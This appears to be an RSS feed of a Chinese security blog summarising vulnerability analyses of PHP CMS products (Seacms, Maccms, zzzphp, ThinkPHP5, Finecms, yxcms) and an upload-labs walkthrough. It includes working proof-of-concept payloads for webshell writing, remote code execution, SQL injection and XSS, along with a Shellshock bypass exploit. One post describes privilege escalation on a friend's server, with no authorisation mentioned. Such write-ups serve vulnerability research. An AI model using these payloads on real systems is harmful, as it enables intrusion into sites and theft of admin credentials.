 可以看到phpinfo执行了
  0x03 漏洞分析 phpstorm调试走起，我忽略掉一些步骤，比如怎么用phpstorm调试 这里有写到[Breakpoint debugging with phpstorm+xdebug](http://getshe11.com/2018/04/10/Breakpoint debugging with phpstorm+xdebug/)
这里不下断点直接从开头断下，具体设置在http://getshe11.com/2018/12/22/ThinkPHP5-remote-code-execution-vulnerability-dynamic-analysis/ 有提到。
当执行到require(MAC_ROOT.&#39;/inc/common/360_safe3.php&#39;);我们走进去看下，可以看到匹配规则并没有匹配到我们输入的字符,然后继续往下走了。
到模板内容替换这一块就不跟大家继续走了，大家有时间可以自己走一遍程序的替换流程，我们直接往下走
到这里，我们F7跟进去
F8往下走到eval这里可以看到，除了在接受get、post数据那一块有过滤sql语句的检测，到这里没有任何过滤就直接执行了。
0x04 80w个a绕过匹配漏洞 这个漏洞很有趣，我居然没想到用的是一个P神之前发的一篇文章的PHP利用PCRE回溯次数限制绕过某些安全限制
这个是Maccms8最新的一个版本里面存在，这个也是修复上面的rce的漏洞的版本。
payload：
POST /index.php?m=vod-search HTTP/1.1 Host: xxxx Cache-Control: max-age=0 DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.</description>
    </item>
    
    <item>
      <title>Seacms9.92从变量覆盖到getshell</title>
      <link>https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/</link>
      <pubDate>Tue, 22 Oct 2019 11:17:18 +0000</pubDate>
      
      <guid>https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/</guid>
      <description>文章的markdown的版本弄丢了，之前在知乎写的还在
https://zhuanlan.zhihu.com/p/86986342</description>
    </item>
    
    <item>
      <title>Seacms&lt;=9.92前台Getshell</title>
      <link>https://getshe11.com/post/seacms-front-desk-getshell/</link>
      <pubDate>Fri, 27 Sep 2019 01:01:30 +0000</pubDate>
      
      <guid>https://getshe11.com/post/seacms-front-desk-getshell/</guid>
      <description>0x01 前言 好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这套程序的时候也审计了一下，后面太多事情就搁置了。
0x02 漏洞复现 环境是phpstudy（最近出后门新闻最火的那个），用着也挺方便的。PHP版本是5.x的。 payload：
http://127.0.0.1/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=*hex/@eval($_GET[_]);?%3E 然后访问：
http://127.0.0.1/data/mysqli_error_trace.php?_=phpinfo(); 0x03 漏洞分析 关于这个SQL注入报错的地方，在之前的8.7的一篇文章里面分析过了https://getpass.cn/2019/03/04/Seacms8.7-sql-injection-analysis/
主要的地方还是在于include/sql.class.php这个文件的465-489行
它会将sql报错的信息写入了一个PHP的文件里，那我们可以就可以让sql语句报错然后将恶意语句写这个文件利用了。
0x04 结束 其实这个漏洞还挺简单的，但是在其他的版本代码是不一样的，我测试了9.2的还有之前写SQL注入的8.7版本都是不能利用的。主要代码如下： 这里是说如果我们要删除第476行的两个反斜杠，然后才可以显示报错的内容。我想是在很久之前的版本是直接写入PHP文件的，但是后面作为更新了，就加上这段代码，然后将之前的PHP存在的就删除掉。 但是这个说是9.92版本出现的就很奇怪了。em&amp;hellip;
文章测试的9.92版本程序下载地址：https://www.lanzous.com/i6eupwh</description>
    </item>
    
    <item>
      <title>一次艰难的渗透提权过程</title>
      <link>https://getshe11.com/post/a-difficult-penetration-process/</link>
      <pubDate>Mon, 09 Sep 2019 02:11:19 +0000</pubDate>
      
      <guid>https://getshe11.com/post/a-difficult-penetration-process/</guid>
      <description>0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/
然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。
0x02 信息探测 上一个phpinfo看下环境
PHP Version 5.6.30 disable_functions: passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru sendmail_path:/usr/sbin/sendmail -t -i mysql:	mysqlnd 5.0.11-dev - 20120503 宝塔警告！ 问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。 0x03 肝 putenv这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html http://www.exploit-db.com/exploits/35146/ 的POC
&amp;lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271  function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.</description>
    </item>
    
    <item>
      <title>某云分发APP上传漏洞</title>
      <link>https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/</link>
      <pubDate>Fri, 06 Sep 2019 10:47:03 +0000</pubDate>
      
      <guid>https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/</guid>
      <description>0x01 前言 大概有几个月没写文章了，最近都在忙(咸鱼),在某此渗透行动中发现的一个洞，感觉是开发留的一个后门。
0x02 漏洞复现 Payload：
POST /source/pack/upload/index-uplog.php HTTP/1.1 Host: 127.0.0.1 Connection: close User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZWa8hDK6XlSEJhi7 Accept: */* Accept-Language: zh-CN,zh;q=0.9 Content-Length: 322 ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;#34;app&amp;#34;; filename=&amp;#34;Lighthouse.php&amp;#34; Content-Type: image/jpeg &amp;lt;?php phpinfo();;unlink(__FILE__);?&amp;gt; ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;#34;time&amp;#34; test ------WebKitFormBoundaryZWa8hDK6XlSEJhi7-- 执行后会在\data\tmp下生成test.php文件
访问url:http://127.0.0.1/data/tmp/test.php
0x03 漏洞分析 漏洞文件位置:source/pack/upload/index-uplog.php
&amp;lt;?php if(!empty($_FILES)){ $filepart = pathinfo($_FILES[&amp;#39;app&amp;#39;][&amp;#39;name&amp;#39;]); $extension = strtolower($filepart[&amp;#39;extension&amp;#39;]); if(in_array($extension,array(&amp;#39;ipa&amp;#39;,&amp;#39;apk&amp;#39;,base64_decode(&amp;#39;cGhw&amp;#39;)))){ $time = $_POST[&amp;#39;time&amp;#39;]; $dir = &amp;#39;../../../data/tmp/&amp;#39;.$time.&amp;#39;/&amp;#39;; if(!</description>
    </item>
    
    <item>
      <title>浅析PHP反序列化漏洞</title>
      <link>https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/</link>
      <pubDate>Wed, 05 Jun 2019 17:00:57 +0000</pubDate>
      
      <guid>https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/</guid>
      <description>0x01 前言 很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。
0x02 PHP序列化和反序列化基础 我们想要将数组值存储到数据库时，就可以对数组进行序列化操作，然后将序列化后的值存储到数据库中。其实PHP序列化数组就是将复杂的数组数据类型转换为字符串，方便数组存库操作。对PHP数组进行序列化和反序列化操作，主要就用到两个函数，serialize和unserialize。
PHP序列化：serialize 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。
序列化函数原型如下：
string serialize ( mixed $value ) 先看个例子
&amp;lt;? php class TEST { public $data; private $pass; public function __construct($data, $pass) { $this-&amp;gt;data = $data; $this-&amp;gt;pass = $pass; } } $number = 34; $str = &amp;#39;user&amp;#39;; $bool = true; $null = NULL; $arr = array(&amp;#39;a&amp;#39; =&amp;gt; 10, &amp;#39;b&amp;#39; =&amp;gt; 200); $test = new TEST(&amp;#39;uu&amp;#39;, true); var_dump(serialize($number)); var_dump(serialize($str)); var_dump(serialize($bool)); var_dump(serialize($null)); var_dump(serialize($arr)); var_dump(serialize($test)); ?</description>
    </item>
    
    <item>
      <title>zzzphp1.61 代码审计-从SQL注入到Getshell</title>
      <link>https://getshe11.com/post/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</link>
      <pubDate>Sun, 10 Mar 2019 17:56:36 +0000</pubDate>
      
      <guid>https://getshe11.com/post/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</guid>
      <description>0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&amp;#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&amp;#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
&amp;lt;?php define(&amp;#39;LOCATION&amp;#39;, &amp;#39;search&amp;#39;); require dirname(dirname(__FILE__)). &amp;#39;/inc/zzz_client.php&amp;#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
switch ($location) { case &amp;#39;about&amp;#39;: $tplfile= TPL_DIR .</description>
    </item>
    
    <item>
      <title>Seacms 8.7版本SQL注入分析</title>
      <link>https://getshe11.com/post/seacms8.7-sql-injection-analysis/</link>
      <pubDate>Mon, 04 Mar 2019 15:49:11 +0000</pubDate>
      
      <guid>https://getshe11.com/post/seacms8.7-sql-injection-analysis/</guid>
      <description>0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
0x03 漏洞详情 漏洞复现 payload:
http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 漏洞分析 在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用extractvalue()、updatexml()报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。
漏洞文件是在：comment/api/index.php
&amp;lt;?php session_start(); require_once(&amp;#34;../../include/common.php&amp;#34;); $id = (isset($gid) &amp;amp;&amp;amp; is_numeric($gid)) ? $gid : 0; $page = (isset($page) &amp;amp;&amp;amp; is_numeric($page)) ? $page : 1; $type = (isset($type) &amp;amp;&amp;amp; is_numeric($type)) ? $type : 1; $pCount = 0; $jsoncachefile = sea_DATA.&amp;#34;/cache/review/$type/$id.js&amp;#34;; //缓存第一页的评论 if($page&amp;lt;2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page&amp;lt;2) { createTextFile($h,$jsoncachefile); } die($h);	function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(&amp;#34;&amp;#34;,&amp;#34;&amp;#34;,$page,0,10,$type,$id); if($id&amp;gt;0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(&amp;#39;,&amp;#39;,$rlist); if(!</description>
    </item>
    
    <item>
      <title>2019年我来了！</title>
      <link>https://getshe11.com/post/2019/</link>
      <pubDate>Sun, 27 Jan 2019 00:24:46 +0000</pubDate>
      
      <guid>https://getshe11.com/post/2019/</guid>
      <description>回顾 2018过去了，迎来新的一年，回想过去这一年里面。
自己有写2018年的规划，比赛、CVE、挖洞等计划都完成了。
18年首先是完成了17年留下的遗憾，因小失误错失国一，因此奋起直追，再次参加比赛，不拿国一终不回。结果也想到了，国一到手了，回过头来看，自己在专注比赛内容，却把渗透的核心拉下了。
最可怕就是自己那浮躁的心，总是动摇不定，看到大神们的文章作品自己却不知道何去何从，总是在原地踏步。
有一段时间，我的轻度抑郁症又开始发作了。那时候发现自己腰特别疼，睡也不舒服，开始各种怀疑自己身体状况是否出问题了。去医院做了磁共振，腰肌劳损，不能久坐。开始放下了手上的计划，有空经常会出去散步，随便逛逛，发现这个城市的美。后来心也平定下来了，开始想拾起以前的计划，却发现久不做再拿起却是一件困难的事情。
不过没关系，知识失去了还可以重新找回，可当初那份初心失去了就再也找不回来了。
我开始回炉再造，之前停滞不前确实一直都在班门弄斧，都只是在表面上。只有深厚的地基，才能稳住高楼大厦。
2019 2019我来了！
事情没做出来，话不多说，2020年拭目以待吧！
在这里提前跟大家拜个年，祝大家新年快乐，身体健康，万事如意！</description>
    </item>
    
    <item>
      <title>ThinkPHP5 远程代码执行漏洞动态分析</title>
      <link>https://getshe11.com/post/thinkphp5-remote-code-execution-vulnerability-dynamic-analysis/</link>
      <pubDate>Sat, 22 Dec 2018 11:17:18 +0000</pubDate>
      
      <guid>https://getshe11.com/post/thinkphp5-remote-code-execution-vulnerability-dynamic-analysis/</guid>
      <description>0x01 前言 这个漏洞已经过去了十多天了，最近比较忙，一直没有写分析的文章。今天抽点时间出来写一篇动态分析的文章，远程执行漏洞用动态分析比较方便也看出整个执行的过程和一些变量参数。
 ThinkPHP官方最近修复了一个严重的远程代码执行漏洞。这个主要漏洞原因是由于框架对控制器名没有进行足够的校验导致在没有开启强制路由的情况下可以构造恶意语句执行远程命令，受影响的版本包括5.0和5.1版本。
 0x02 环境 程序源码下载：http://www.thinkphp.cn/download/967.html Web环境：Windows 10 x64+PHPStudy 2018 调试工具：phpstorm+xdebug(用vscode也可以，我比较习惯用phpstorm)
xdebug调试配置可以参考我的一篇文章https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/
因为我是从头分析到尾，所以要在设置里面勾上Break at first line in PHP script
搭建就不多说了，放源码在根目录然后phpstudy启动！
0x03 漏洞复现 奉上我们的Poc：http://getpass.test/public/index.php?s=index/\think\Request/input&amp;amp;filter=phpinfo&amp;amp;data=1
其实有很多利用的地方，到后面分析完再说。
0x04 漏洞分析 因为是从开始分析，也比较适合新手，虽然啰嗦了点哈，我就不演示去下某个断点了，如果有不懂的你们也可以在不懂的地方下一个断点然后继续分析（记得去掉Break at first line in PHP script再下断点）。
有些不是重点的直接F7或者F8走下去,F7跟进Facade
到App.php初始化的地方，继续F8往下面走
到routeCheckF7跟进去
到这里F7继续跟进去
有些没有必要的函数就直接F8跳过去,到pathinfo()这里F7跟进去
我们可以分析一下这个·pathinfo函数的代码$this-&amp;gt;config-&amp;gt;get(&#39;var_pathinfo&#39;)这一句是从配置文件config/app.php获取的值
当请求报文包含$_GET[&#39;s&#39;]，就取其值作为pathinfo，并返回pathinfo给调用函数，所以我们可利用$_GET[&amp;rsquo;s&#39;]来传递路由信息。
public function pathinfo() { if (is_null($this-&amp;gt;pathinfo)) { if (isset($_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)])) { // 判断URL里面是否有兼容模式参数  $_SERVER[&amp;#39;PATH_INFO&amp;#39;] = $_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)]; unset($_GET[$this-&amp;gt;config-&amp;gt;get(&amp;#39;var_pathinfo&amp;#39;)]); } elseif ($this-&amp;gt;isCli()) { // CLI模式下 index.php module/controller/action/params/...  $_SERVER[&amp;#39;PATH_INFO&amp;#39;] = isset($_SERVER[&amp;#39;argv&amp;#39;][1]) ?</description>
    </item>
    
    <item>
      <title>upload-labs 通关笔记</title>
      <link>https://getshe11.com/post/upload-labs/</link>
      <pubDate>Sat, 24 Nov 2018 15:41:37 +0000</pubDate>
      
      <guid>https://getshe11.com/post/upload-labs/</guid>
      <description>upload-labs 通关笔记 前言 把上传的所有类型的漏洞都过一遍，然后做一个笔记，方便以后查看，在此也很感谢c0ny1大佬的平台。
运行环境 php版本：推荐5.2.17(其他版本可能会导致部分Pass无法突破) php组件：php_gd2,php_exif（部分Pass需要开启这两个组件） apache：以moudel方式连接 PS：为了节省时间，可下载Windows下集成环境，解压即可运行靶机环境。
Pass-01 我比较喜欢去看代码分析问题，所以仔细分析了程序的构造。
表单上传文件变量是upload_file
&amp;lt;input class=&amp;#34;input_file&amp;#34; type=&amp;#34;file&amp;#34; name=&amp;#34;upload_file&amp;#34;/&amp;gt; 再来看下PHP代码,UPLOAD_PATH是在config.php文件里面的常量define(&amp;quot;UPLOAD_PATH&amp;quot;, &amp;quot;../upload/&amp;quot;);,PHP的代码没有什么过滤的，直接就可以上传了。
但是在这个上传这里我弄了很久，因为Linux的一些机制接触比较少，用的环境是CentOS 7，PHP版本是5.4。
上传的时候一直失败，测试了$_FILES里面的参数都没什么问题，upload目录的权限也测试了，临时文件tmp也测试了，还是不行。
一直到下面的move_uploaded_file函数这里，百度了下已有人遇到同样的问题，解决的办法就关掉selinux输入：
setenforce 0 
就OK了。
&amp;lt;?php include &amp;#39;../config.php&amp;#39;; include &amp;#39;../head.php&amp;#39;; include &amp;#39;../menu.php&amp;#39;; $is_upload = false; $msg = null; if (isset($_POST[&amp;#39;submit&amp;#39;])) { if (file_exists(UPLOAD_PATH)) {//判断UPLOAD_PATH上传目录是否存在  $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];//获取临时文件名  $img_path = UPLOAD_PATH . &amp;#39;/&amp;#39; . $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;];//上传目录+上传时的文件名  if (move_uploaded_file($temp_file, $img_path)){//把临时文件移到UPLOAD_PATH目录  $is_upload = true; } else { $msg = &amp;#39;上传出错！&amp;#39;; } } else { $msg = UPLOAD_PATH .</description>
    </item>
    
    <item>
      <title>Finecms 5.0.10 Multiple vulnerability analysis</title>
      <link>https://getshe11.com/post/finecms-5.0.10-multiple-vulnerabilities/</link>
      <pubDate>Wed, 07 Nov 2018 14:30:25 +0000</pubDate>
      
      <guid>https://getshe11.com/post/finecms-5.0.10-multiple-vulnerabilities/</guid>
      <description>0x01 前言 已经一个月没有写文章了，最近发生了很多事情，之前的每日一洞、每周一洞，到现在的每月一洞了。感觉去审计多了就好比如去刷题，但是我觉得应该做一个系统化的学习. 今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。
0x02 环境搭建 https://www.ichunqiu.com/vm/59011/1 可以去I春秋的实验，不用自己搭建那么麻烦了。
0x03 任意文件上传漏洞 1.漏洞复现 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php 2.漏洞分析 文件：finecms/dayrui/controllers/member/Account.php 177~244行
/** * 上传头像处理 * 传入头像压缩包，解压到指定文件夹后删除非图片文件 */ public function upload() { // 创建图片存储文件夹  $dir = SYS_UPLOAD_PATH.&amp;#39;/member/&amp;#39;.$this-&amp;gt;uid.&amp;#39;/&amp;#39;; @dr_dir_delete($dir); !is_dir($dir) &amp;amp;&amp;amp; dr_mkdirs($dir); if ($_POST[&amp;#39;tx&amp;#39;]) { $file = str_replace(&amp;#39; &amp;#39;, &amp;#39;+&amp;#39;, $_POST[&amp;#39;tx&amp;#39;]); if (preg_match(&amp;#39;/^(data:\s*image\/(\w+);base64,)/&amp;#39;, $file, $result)){ $new_file = $dir.&amp;#39;0x0.&amp;#39;.$result[2]; if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &amp;#39;&amp;#39;, $file)))) { exit(dr_json(0, &amp;#39;目录权限不足或磁盘已满&amp;#39;)); } else { $this-&amp;gt;load-&amp;gt;library(&amp;#39;image_lib&amp;#39;); $config[&amp;#39;create_thumb&amp;#39;] = TRUE; $config[&amp;#39;thumb_marker&amp;#39;] = &amp;#39;&amp;#39;; $config[&amp;#39;maintain_ratio&amp;#39;] = FALSE; $config[&amp;#39;source_image&amp;#39;] = $new_file; foreach (array(30, 45, 90, 180) as $a) { $config[&amp;#39;width&amp;#39;] = $config[&amp;#39;height&amp;#39;] = $a; $config[&amp;#39;new_image&amp;#39;] = $dir.</description>
    </item>
    
    <item>
      <title>Python Web学习方法</title>
      <link>https://getshe11.com/post/python-web-guide/</link>
      <pubDate>Mon, 01 Oct 2018 08:49:25 +0000</pubDate>
      
      <guid>https://getshe11.com/post/python-web-guide/</guid>
      <description>0x01 前言 学习Python Web的时候找到的一篇挺好的文章，里面写的也很实在，所有分享出来。
0x02 学习路线 看了这么多是不是还有点懵，笔者当时自学的时候也没人带，没什么方向，走了很多弯路，找工作也不是一帆风顺。如果不是科班出身受过系统的计算机科学理论的训练，是比较吃亏的，只能通过大量针对性学习和练习来弥补。 大概整理下自己学习 python web 的路线，方便大家做个参考(一个合格的工程师不是短时间能练成的)。其实这基本上也是后端工程师的学习路线，换一个编程语言或者框架都差不多。技术更新迭代非常快，后端技术还算比较稳定的，但是知识点很多很杂，有针对性学习比较好。 如果你觉得这个教程列出的东西太多，建议就找最重要的知识点，每个知识点挑一本最合适的书学习，我列举的很多资料对于初学者来说可能短时间内难以消化，会有畏难心理和学习焦虑，建议多加练习通过正反馈提升自己学习的乐趣。（如果你还是个学生那很好，有大把的时间准备）
 学习并熟练掌握一门编程语言(学好英语)。这里笔者选择的是最近特别火的 python，它能干很多事。挑一本好的入门教材，通读并实践书中所有代码示例和练习题（练手感，坚持敲，大量敲）。了解该语言如何操作文本、进程、网络编程等，最后达到能熟练运用编程语言表达逻辑的能力。 搭建好开发环境。初学者个人比较推荐 Ubuntu 系统 + Pycharm 社区版，都是可以免费获取的，我经常安利用 linux 或者 mac，和桌面端不同，企业大部分用的都是 linux server 部署 web 应用的(包括 docker 容器技术等都是基于 linux)，熟悉 linux 命令行、文件、进程操作等会给你找工作和日常工作带来便利。 熟悉算法和数据结构。对于编程语言内置的数据结构、算法等要数量掌握和使用，常用数据结构和算法了解其原理，会计算时间空间复杂度，会自己实现(常见算法面试笔试常考)。 熟悉网络协议 TCP/IP，HTTP，了解互联网是怎么运作的。既然是做网站，需要对网络运行原理比较了解。 学习 web 框架和 python 库。做东西我们需要大量现成的轮子帮助我们，看下 django、flask 等流行的 tutorial，然后做个简单的网站出来（比如博客网站，一般按照教程撸一遍就入门了，python web 框架的文档非常完善）。最好能深入一个框架了解原理，比如看看 flask 和 Werkzeug 源码。 了解前端知识。如果能独立做一个博客出来，大概对 html、css、js 就有所了解了。虽然是做后端，但是基本的前端知识也是必不可少的。 学习业务常用数据库 mysql 和 redis，业界用得比较多的数据库。了解关系型数据库 mysql 基础概念、语句、索引优化等，了解内存型数据库 redis 的常用数据结构，使用场景、结构设计等。 学习 git 版本控制。公司项目协作的时候都是有版本控制的，方便我们协作、记录、回滚代码等。学习编码规范，培养良好的编程习惯。我建议一开始就遵守 pep8，用好 autopep8，pylint 等工具，写出格式规范的代码，不要走野路子。（学习下文档和规范很棒的 python 开源代码） 在 linux server 部署你的 python web 服务。你需要学习 linux 常用命令，web 服务器 nginx 等。最好能独立部署一个网站出来。(笔者经常安利 linux 或者 mac，即使不用来作为开发环境，也要熟悉 linux 命令，能帮助你在服务器上快速修改和调试代码) 对照招聘网站中意的公司的招聘需求查漏补缺。初期就是要多学多练多 google，不是做项目就是在刷题。可以做一些博客、论坛、管理后台等小网站练手。 老实说相比 java 和 php，python 后端岗位是比较少的，如果你学完了还没找到工作然后来臭骂我一顿我会感觉委屈的。我个人倾向于 python 是因为真爱，并且学习python 性价比很高，可以做很多事。如果你觉得不好找工作或者只是把 python 当玩具玩(比如用 pandas 分析自己的投资收益，回测等)，换个语言和技术栈后端路线图基本上还是这些，不会白学的。 建议坚持写技术博客，学习笔记等。你可以使用 hexo 之类的静态博客，或者知乎专栏等现成的服务，或者 readthedoc、gitbook 之类的文档工具。好的技术博客是找工作的一大加分项，笔者工作以后依然坚持写博客记录日常所学，可以是读书笔记、学习心得、对某个技术的理解和实践、甚至是备忘录等。 进阶建议：看《Fluent Python》 之类的进阶书籍；看优秀的源码，比如 python 一些内置库，flask 等优秀的框架源码(可以用 gitx 之类的工具从代码的最初提交开始看起)，能学到很多惯用法和稍微底层一些的东西。尝试仿写，比如实现个简单的 web 小框架，大概就了解框架的运行原理了。  求职与面试 最近笔者也开始当面试官了，之前求职的时候每次面试都会充分准备（当然也挂过很多次），提前一个月左右开始回顾重点理论知识(看面试相关的书)，刷常用算法，练习手写代码，看相对岗位的招聘需求等。最近面试就发现很多面试者无论是否是有经验都准备不足，忽略了基础知识。 如果没有知名公司或者项目相关背景，很多招聘要求比较高的公司都会比较看重理论基础和学习能力。公司最好能有一份针对初级、中级、高级岗位的题目，尽量覆盖面广泛、难度适中，防止因为面试官的个人喜好影响面试结果。</description>
    </item>
    
    <item>
      <title>yxcms 1.4.7 最新版漏洞分析</title>
      <link>https://getshe11.com/post/yxcms-1.4.7-latest-version-of-vulnerability-analysis/</link>
      <pubDate>Mon, 17 Sep 2018 13:16:06 +0000</pubDate>
      
      <guid>https://getshe11.com/post/yxcms-1.4.7-latest-version-of-vulnerability-analysis/</guid>
      <description>0x01前言 在先知看到的，大部分都是后台漏洞，部分厂商对于后台的漏洞都不认可，因为厂商觉得能进入后台这些漏洞都不是漏洞。最恐怖的是厂商否认了漏洞存在，然后偷偷的去修复。
0x02 安装程序 具体的安装和使用的详细可以上官网查看https://www.kancloud.cn/yongheng/yxcms
0x03 前台XSS 1.漏洞复现  打开链接http://sb.com/index.php?r=default/column/index&amp;amp;col=guestbook 输入payload：&amp;lt;svg/onload=alert(1)&amp;gt;    然后登陆后台，查看审核 点击编辑   2.漏洞分析  前台的文件源码protected/apps/default/controller/columnController.php  public function index() { $ename=in($_GET[&amp;#39;col&amp;#39;]); if(empty($ename)) throw new Exception(&amp;#39;栏目名不能为空~&amp;#39;, 404); $sortinfo=model(&amp;#39;sort&amp;#39;)-&amp;gt;find(&amp;#34;ename=&amp;#39;{$ename}&amp;#39;&amp;#34;,&amp;#39;id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid&amp;#39;); $path=$sortinfo[&amp;#39;path&amp;#39;].&amp;#39;,&amp;#39;.$sortinfo[&amp;#39;id&amp;#39;]; $deep=$sortinfo[&amp;#39;deep&amp;#39;]+1; $this-&amp;gt;col=$ename; switch ($sortinfo[&amp;#39;type&amp;#39;]) { case 1://文章 $this-&amp;gt;newslist($sortinfo,$path,$deep); break; case 2://图集 $this-&amp;gt;photolist($sortinfo,$path,$deep); break; case 3://单页 $this-&amp;gt;page($sortinfo,$path,$deep); break; case 4://应用 break; case 5://自定义 break; case 6://表单 $this-&amp;gt;extend($sortinfo,$path,$deep); break; default: throw new Exception(&amp;#39;未知的栏目类型~&amp;#39;, 404); break; } }  后台的文件源码protected/apps/admin/controller/extendfieldController.</description>
    </item>
    
    <item>
      <title>动态调试|Maccms SQL 注入分析(附注入盲注脚本)</title>
      <link>https://getshe11.com/post/maccms-sql-injection-analysis/</link>
      <pubDate>Sun, 26 Aug 2018 15:49:02 +0000</pubDate>
      
      <guid>https://getshe11.com/post/maccms-sql-injection-analysis/</guid>
      <description>0x01 前言 已经有一周没发表文章了，一个朋友叫我研究maccms的代码审计，碰到这个注入的漏洞挺有趣的，就在此写一篇分析文。
0x02 环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： JetBrains PhpStorm 2018.1.6 x64、Seay代码审计工具
搭建这个程序也挺简单的，也是一步到位。
